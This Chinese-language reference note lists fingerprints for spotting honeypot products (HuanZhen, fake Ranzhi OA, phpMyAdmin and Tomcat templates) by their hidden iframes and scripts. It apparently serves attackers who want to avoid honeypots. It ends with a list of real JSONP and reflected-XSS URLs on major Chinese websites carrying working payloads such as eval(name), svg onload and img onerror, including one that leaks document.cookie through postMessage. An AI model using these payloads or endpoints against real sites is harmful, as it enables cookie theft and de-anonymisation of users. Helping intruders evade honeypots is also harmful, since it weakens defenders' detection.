默安幻阵蜜罐系统特征：
```
iconhash="a274b071560a7f32cba1cbc4d9e014b9"
title="幻阵"
body="/static/video.b1f7b70b.mp4"
```
然之协同OA蜜罐模板特征：
```
iconhash="9fd6f0e56f12adfc2a4da2f6002fea7a" and body="iframe"
title="然之协同" and body="iframe"
body=">v.ignoreNotice" and body="iframe"
```
然之协同OA蜜罐获取jsonp特征：
```
<script src="./ifaeJQj9UVuu（随机）/jquery.min.js"></script>
<iframe src="ifaeJQj9UVuu（随机）/index.html" width="0" height="0"></iframe>
http://xxx/ifaeJQj9UVuu（随机）/index.js

```
```
<script src='https://api.zdoo.com/updater-latest-biz5.7.4.html?v=biz5.7.4' type='text/javascript'></script>
<script src='http://api.ranzhico.com/updater-latest-pro2.2.2.html?v=pro2.2.2' type='text/javascript'></script>
<script src='http://api.ranzhico.com/updater-latest-3.7.html?v=3.7' type='text/javascript'></script>
<script src='http://api.ranzhi.org/updater-latest-5.2.html?v=5.2' type='text/javascript'></script>
<script src='http://api.ranzhico.com/updater-latest-4.5.html?v=4.5' type='text/javascript'></script>
```
ranzhico.com域名正在出售

api.ranzhi.org跳转api.zdoo.com

phpMyAdmin蜜罐模板特征：
```
app="phpMyAdmin" && body=="fromCharCode"
app="phpMyAdmin" && body=="iframe"
```

phpMyAdmin蜜罐获取jsonp特征：
```
<iframe src="UHh8VFXLzDMKall（随机）/index.html" width="0" height="0"></iframe>
<script src="./UHh8VFXLzDMKall（随机）/jquery.min.js"></script>
<script src="UHh8VFXLzDMKall（随机）/index.js"></script>
https://xxx/UHh8VFXLzDMKall（随机）/static.js
https://xxx/UHh8VFXLzDMKall（随机）/trace_type?api=1

```

Tomcat蜜罐获取jsonp特征：
```
<iframe src="P7FydZ4kjata（随机）/index.html" height="0" width="0"></iframe>
<script src="./P7FydZ4kjata（随机）/jquery.min.js"></script>
<script src="P7FydZ4kjata（随机）/index.js"></script>
```

其他模板特征：
```
<script src="./（随机）/jquery.min.js"></script>
<script>var a0_0x5bd9=
<script>var a0_0x343c=
...
<iframe src="（随机）/index.html" width="0" height="0"></iframe>
http://xxx/（随机）/index.js
```

部分jsonp接口：
```
https://hudong.vip.youku.com/act/mili/download.html?mobile=1&xxoo=chrome-extension://&download=javascript:new%20Function(name)();//https://down2.uc.cn///https://itunes.apple.com/app

http://api-live.iqiyi.com/stream/geth5?qd_tm=1553094041094&&xxoo=chrome-extension://&typeId=1&platform=7&vid=0&qd_vip=0&qd_uid=2327344064&qd_ip=x.x.x.x&qd_vipres=0&qd_src=h5_xiu&qd_tvid=0&_=1553094041094&callback=%3Csvg/onload=eval(name)%3E

https://m.iask.sina.com.cn/cas/logins?domain=iask.sina.com.cn&xxoo=chrome-extension://&businessSys=iask&channel=null&popup=show&clsId=undefined&fid=%22%3E%3Cscript%3Eeval(name)%3C/script%3E

https://wz.cnblogs.com/create?t=xxxx&xxoo=chrome-extension://&&u=%22%3E%3Csvg/onload=eval(name)%3E&c=&i=0

https://api.csdn.net/oauth/authorize?client_id=1000001&xxoo=chrome-extension://&redirect_uri=http://www.iteye.com/auth/csdn/callback&response_type=%22https%3A%2F%2Fapi.csdn.net%2Foauth%2Fauthorize%3Fclient_id%3D1000001%26redirect_uri%3D%22http%3A%2F%2Fwww.iteye.com%2Fauth%2Fcsdn%2Fcallback%26response_type%3D%22%3E%3Cimg%20src%3Dx%20onerror%3Deval(window.name)%3E

http://databack.dangdang.com/dde.php?platform=pc&xxoo=chrome-extension://&type=3&url=http%253A%252F%252Fwww.dangdang.com%252F&charset=GBK&perm_id=20200530121832924211210288241440628&page_id=mix_317715&website=dangdang.com&expose=%255B%2522mix_317715.3208542%252C9339%252C9354..%2522%252C%2522mix_317715.3208542%252C9339%252C9356..%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9341..%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.1.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.2.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.3.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.4.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.5.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.6.%2522%252C%2522mix_317715.3208542%252C9339%252C9356%252C9342.7.%2522%255D&callback=%3Ciframe/src=javascript:eval(%22window.parent.window.parent.postMessage({source:%20%22dangdang%22,%20d:%20document.cookie},%20%22*%22);%22)%3E

http://databack.dangdang.com/dde.php?platform=pc&xxoo=chrome-extension://&type=3&url=http://www.dangdang.com/&charset=GBK&perm_id=20200530121832924211210288241440628&page_id=mix_317715&website=dangdang.com&expose=123&callback=%22%3E%3Cscript%3Eeval(name)%3C/script%3E

https://mooc1-1.chaoxing.com/api/workTestPendingNew?&xxoo=chrome-extension://&classIds=%3CScRiPt%3Eeval(name)%3C/sCrIpT%3E

https://account.cnblogs.com/signin?ReturnUrl=https%3A%2F%2Fwz.cnblogs.com%2Fcreate%3Ft%3Dxxxx%26xxoo%3Dchrome-extension%3A%2F%2F%26%26u%3D%2522%253E%253Csvg%2Fonload%3Deval(name)%253E%26c%3D%26i%3D0

https://api.csdn.net/oauth/x

https://p.qiao.baidu.com/cps3/chatIndex?siteToken=%3C/script%3E%3Cimg%20src=x%20onerror=eval(window.name)%3E&xxoo=chrome-extension://&speedLogId=&eid=28181423&reqParam=%7B%22from%22%3A0%2C%22sid%22%3A%22-100%22%2C%22tid%22%3A%22-1%22%2C%22ttype%22%3A1%2C%22siteId%22%3A%2213768072%22%2C%22userId%22%3A%2228181423%22%2C%22pageId%22%3A0%7D

http://my.zol.com.cn/public_new.php?xxoo=chrome-extension://

https://api.m.jd.com/client.action?functionId=getBabelProductPaged&xxoo=chrome-extension://&body=%7b%22%73%65%63%6f%6e%64%54%61%62%49%64%22%3a%22%30%30%31%35%35%35%35%34%37%30%38%39%33%5f%30%33%37%32%36%36%30%30%5f%22%2c%22%74%79%70%65%22%3a%22%30%22%2c%22%70%61%67%65%4e%75%6d%22%3a%22%31%22%2c%22%6d%69%74%65%6d%41%64%64%72%49%64%22%3a%22%22%2c%22%67%65%6f%22%3a%7b%22%6c%6e%67%22%3a%22%22%2c%22%6c%61%74%22%3a%22%22%7d%2c%22%61%64%64%72%65%73%73%49%64%22%3a%22%22%2c%22%70%6f%73%4c%6e%67%22%3a%22%22%2c%22%70%6f%73%4c%61%74%22%3a%22%22%2c%22%66%6f%63%75%73%22%3a%22%22%2c%22%69%6e%6e%65%72%41%6e%63%68%6f%72%22%3a%22%22%7d&screen=2799*1208&client=wh5&clientVersion=1.0.0&sid=&uuid=&area=&_=1585823068850&callback=jsonp1

https://home.51cto.com/index.php?s=/Index/getLoginStatus2015/reback/http%253A%252F%252Fwww.51cto.com%252F&xxoo=chrome-extension://

https://home.ctfile.com/iajax.php?item=profile&xxoo=chrome-extension://&action=index&jsonp=jQuery2398423949823

https://api.m.jd.com/api?appid=pc_home_page&xxoo=chrome-extension://&functionId=getBaseUserInfo&loginType=3&jsonp=jsonp2

http://passport.tianya.cn/online/checkuseronline.jsp?t=1584614187028&callback=callback&xxoo=chrome-extension://

https://passport.suning.com/ids/login?service=https%3A%2F%2Fmyjr.suning.com%2Fsfp%2Fauth%3FtargetUrl%3Dhttps%253A%252F%252Fmyjr.suning.com%252Fsfp%252FmutualTrust%252FgetLoginInfo.htm%253Fxxoo%253Dchrome-extension%253A%252F%252F%2526%2526callback%253DjQuery172011468305000873791_1608255922695%2526_%253D1659199043884&gateway=true&loginTheme=defaultTheme&multipleActive=false

https://passport2.chaoxing.com/js/common/commonUtil.js?v=112
```
